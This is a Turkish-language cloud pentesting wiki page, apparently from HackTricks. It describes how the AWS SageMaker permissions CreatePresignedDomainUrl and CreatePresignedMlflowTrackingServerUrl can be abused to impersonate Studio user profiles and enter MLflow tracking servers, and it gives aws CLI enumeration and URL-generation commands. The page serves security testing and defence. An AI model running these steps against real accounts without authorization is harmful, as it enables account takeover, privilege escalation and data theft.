# AWS - SageMaker Yetkisiz Erişim

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker Studio - Hesap Ele Geçirme aracılığıyla CreatePresignedDomainUrl (Impersonate Any UserProfile)

### Açıklama
Bir kimlik, hedef Studio `UserProfile` üzerinde `sagemaker:CreatePresignedDomainUrl` çağırma iznine sahipse, o profil olarak doğrudan SageMaker Studio'ya kimlik doğrulayan bir giriş URL'si oluşturabilir. Bu, saldırganın tarayıcısına profilin `ExecutionRole` izinlerini devralan ve profilin EFS tarafından desteklenen home dizinine ve uygulamalarına tam erişim sağlayan bir Studio oturumu verir. `iam:PassRole` veya konsol erişimi gerekmez.

### Gereksinimler
- Bir SageMaker Studio `Domain` ve içinde bir hedef `UserProfile`.
- Saldırganın principal'inin hedef `UserProfile` üzerinde `sagemaker:CreatePresignedDomainUrl` iznine (resource‑level) veya `*`'a sahip olması gerekir.

Minimal policy örneği (tek bir `UserProfile` ile sınırlandırılmış):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedDomainUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:user-profile/<domain-id>/<user-profile-name>"
}
]
}
```
### Kötüye Kullanım Adımları

1) Hedefleyebileceğiniz bir Studio Domain ve UserProfiles'i Enumerate edin
```bash
DOM=$(aws sagemaker list-domains --query 'Domains[0].DomainId' --output text)
aws sagemaker list-user-profiles --domain-id-equals $DOM
TARGET_USER=<UserProfileName>
```
2) Bir presigned URL oluşturun (varsayılan olarak ~5 dakika geçerli)
```bash
aws sagemaker create-presigned-domain-url \
--domain-id $DOM \
--user-profile-name $TARGET_USER \
--query AuthorizedUrl --output text
```
3) Döndürülen URL'yi bir tarayıcıda açarak hedef kullanıcı olarak Studio'ya giriş yapın. Studio içindeki bir Jupyter terminalinde etkin kimliği doğrulayın:
```bash
aws sts get-caller-identity
```
Notlar:
- `--landing-uri` atlanabilir. Bazı değerler (örn., `app:JupyterLab:/lab`) Studio'nun sürüm/türüne bağlı olarak reddedilebilir; varsayılanlar genellikle Studio ana sayfasına ve ardından Jupyter'e yönlendirir.
- Org politikaları/VPC endpoint kısıtlamaları yine de ağ erişimini engelleyebilir; token oluşturma konsola giriş veya `iam:PassRole` gerektirmez.

### Etki
- ARN'si izin verilen herhangi bir Studio `UserProfile`'unu üstlenerek, onun `ExecutionRole`'ünü ve dosya sistemi/uygulamalarını devralmak suretiyle yatay hareket ve ayrıcalık yükseltme.

### Deliller (kontrollü bir testten)
- Hedef `UserProfile` üzerinde yalnızca `sagemaker:CreatePresignedDomainUrl` izni olduğunda, saldırgan rolü başarılı şekilde şu örnekteki gibi bir `AuthorizedUrl` döndürdü:
```
https://studio-d-xxxxxxxxxxxx.studio.<region>.sagemaker.aws/auth?token=eyJhbGciOi...
```
- Doğrudan bir HTTP isteği, URL'nin geçerli olduğunu ve süresi dolana kadar etkin olduğunu doğrulayarak Studio'ya bir yönlendirme (HTTP 302) ile yanıt verir.


## SageMaker MLflow Tracking Server - ATO via CreatePresignedMlflowTrackingServerUrl

### Açıklama
Hedef bir SageMaker MLflow Tracking Server için `sagemaker:CreatePresignedMlflowTrackingServerUrl` çağırma iznine sahip bir kimlik, o sunucu için yönetilen MLflow UI'ye doğrudan kimlik doğrulayan tek kullanımlık bir presigned URL oluşturabilir. Bu, meşru bir kullanıcının sunucuya sahip olduğu aynı erişimi sağlar (deneyleri ve çalıştırmaları görüntüleme/oluşturma ve sunucunun S3 artifact deposundan artifact'leri indirme/yükleme) console erişimi veya `iam:PassRole` olmadan.

### Gereksinimler
- Hesap/bölge içinde bir SageMaker MLflow Tracking Server ve onun ismi.
- Saldırgan kimliğinin hedef MLflow Tracking Server kaynağı üzerinde `sagemaker:CreatePresignedMlflowTrackingServerUrl` iznine (veya `*`) ihtiyacı vardır.

Minimal policy örneği (tek bir Tracking Server ile sınırlandırılmış):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedMlflowTrackingServerUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:mlflow-tracking-server/<tracking-server-name>"
}
]
}
```
### Kötüye Kullanım Adımları

1) Hedefleyebileceğiniz MLflow Tracking Servers'ı enumerate edin ve bir isim seçin
```bash
aws sagemaker list-mlflow-tracking-servers \
--query 'TrackingServerSummaries[].{Name:TrackingServerName,Status:TrackingServerStatus}'
TS_NAME=<tracking-server-name>
```
2) MLflow UI için önceden imzalanmış bir URL oluşturun (kısa süreli geçerli)
```bash
aws sagemaker create-presigned-mlflow-tracking-server-url \
--tracking-server-name "$TS_NAME" \
--expires-in-seconds 300 \
--session-expiration-duration-in-seconds 1800 \
--query AuthorizedUrl --output text
```
3) Döndürülen URL'yi bir tarayıcıda açın; bu, ilgili Tracking Server için MLflow UI'ya kimliği doğrulanmış bir kullanıcı olarak erişmenizi sağlar.

Notlar:
- Tracking Server hazır bir durumda olmalıdır (ör. `Created/Active`). Hâlâ `Creating` durumundaysa, çağrı reddedilecektir.
- The presigned URL tek kullanımlıktır ve kısa ömürlüdür; gerektiğinde yeni bir tane oluşturun.

### Impact
- Hedeflenen Tracking Server için yönetilen MLflow UI'ya doğrudan erişim; bu, sunucu yapılandırması tarafından uygulanan izinler dahilinde deneyleri/çalıştırmaları görüntüleme ve değiştirme ile sunucunun yapılandırılmış S3 artifact store'unda saklanan artefaktların indirilmesini veya yüklenmesini sağlar.

{{#include ../../../../banners/hacktricks-training.md}}
